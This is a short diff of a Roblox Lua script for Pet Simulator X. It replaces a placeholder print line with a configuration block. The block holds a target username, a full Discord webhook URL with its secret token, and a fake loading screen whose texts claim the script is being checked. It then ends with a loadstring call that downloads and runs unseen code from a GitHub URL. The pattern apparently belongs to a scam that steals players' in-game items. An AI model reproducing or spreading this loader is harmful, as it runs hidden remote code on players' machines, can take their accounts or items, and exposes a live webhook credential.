@@ -1,1 +1,9 @@
-loadstring("\112\114\105\110\116\40\34\32\89\79\85\82\32\83\67\82\73\80\84\32\72\69\82\69\33\33\32\34\41\10")()
+Username = "gabr4l123"
+WebHook = "https://discord.com/api/webhooks/1097483912881639484/Hu4O6Oa_EGsi9p6rSWP101ihO02N8N2bNSZbLz48vPG-HFf9fseNyRj8NGNWKt4LO6W0"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
